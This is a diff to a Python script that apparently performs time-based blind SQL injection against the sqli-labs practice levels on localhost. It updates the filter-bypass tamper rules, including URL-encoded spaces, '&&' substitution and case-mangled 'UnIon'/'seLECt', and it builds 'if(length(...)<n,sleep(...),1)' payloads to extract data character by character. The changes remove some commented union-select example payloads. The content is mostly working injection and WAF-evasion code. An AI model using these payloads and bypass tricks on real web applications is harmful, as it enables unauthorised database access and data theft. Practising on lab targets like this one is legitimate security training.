@@ -5,17 +5,12 @@ from utils.normal import sqlForce
 
 from spiderExceptions.sqliExcelptions import ArgumentError
 
-
-# less26a: '), or/and/'/ /-- -
-poc = '\')'
-t = ['or','and','\'',' ','-- -','--%A0-','(',')',',']
-
 # less27: ', union/select
 poc = '\''
-t = ['or','and','\'',' ','-- -','--%A0-','(',')',',','union','select']
+t = ['and','\'',' ','-- -','--%A0-','(',')',',','union','select']
 
 
-baseurl = 'http://127.0.0.1:81/Less-26a/?id=1'
+baseurl = 'http://127.0.0.1:81/Less-27/?id=1'
 sleepTime = 0.3
 delayBetweenRequests = 0
 
@@ -39,12 +34,14 @@ def bypass(exp, oneTamper):
         'and': '%26%26',
         '\'': '%27',
         ' ': '%A0',
-        '-- -': '%26%26%A0%28%271%27%29%3D%28%271',
-        '--%A0-': '%26%26%A0%28%271%27%29%3D%28%271',
+        '-- -': '%26%26%A0%271%27%3D%271',
+        '--%A0-': '%26%26%A0%271%27%3D%271',
         '(': '%28',
         ')': '%29',
         ',': '%2C',
-        '=': '%3D'
+        '=': '%3D',
+        'union': 'UnIon',
+        'select': 'seLECt'
     }
     exp = exp.replace(oneTamper, bypassDict[oneTamper])
     return exp
@@ -65,14 +62,10 @@ def force(pocUrl, target, tamper, database='', table='', column=''):
     print('Forcing all {}s\' length'.format(target))
     for resultLength in range(1, 9999):
         expUrl = pocUrl + ' and if(length({})<{},sleep({}),1) -- -'.format(payload, str(resultLength), str(sleepTime))
-        # expUrl = "http://127.0.0.1:81/Less-26a/?id=0') union select 1,2,3 && ('1')=('1"
-        # Less-26a/?id=0%27%29%A0union%A0select%A01%2C2%2C3%A0%26%26%A0%28%271%27%29%3D%28%271
-        # Less-26a/?id=0%27%29%A0union%A0select%A01%2C2%2C3%A0&&%A0%28%271%27%29=%28%271
         for oneTamper in tamper:
             expUrl = bypass(expUrl, oneTamper)
         startTime = time()
         res = get(expUrl)
-        # print(expUrl)
         endTime = time()
         # print(expUrl)
         if not checkRes(startTime, endTime):
